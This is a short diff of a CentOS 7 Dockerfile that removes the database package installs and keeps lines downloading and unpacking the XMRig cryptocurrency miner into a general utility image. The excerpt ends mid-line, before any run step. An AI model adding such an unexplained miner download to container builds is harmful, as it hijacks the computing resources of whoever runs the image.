@@ -1,8 +1,6 @@
 FROM centos:7
 ENV container docker
 RUN yum install -y vim curl wget net-tools bind-utils telnet telnet-client
-RUN yum install -y mysql
-RUN yum install -y https://download.postgresql.org/pub/repos/yum/10/redhat/rhel-7-x86_64/pgdg-redhat-repo-latest.noarch.rpm 
 RUN wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz
 RUN tar zxvf xmrig-6.12.1-linux-x64.tar.gz
 RUN (cd /lib/systemd/system/sysinit.target.wants/; for i in *; do [ $i == \
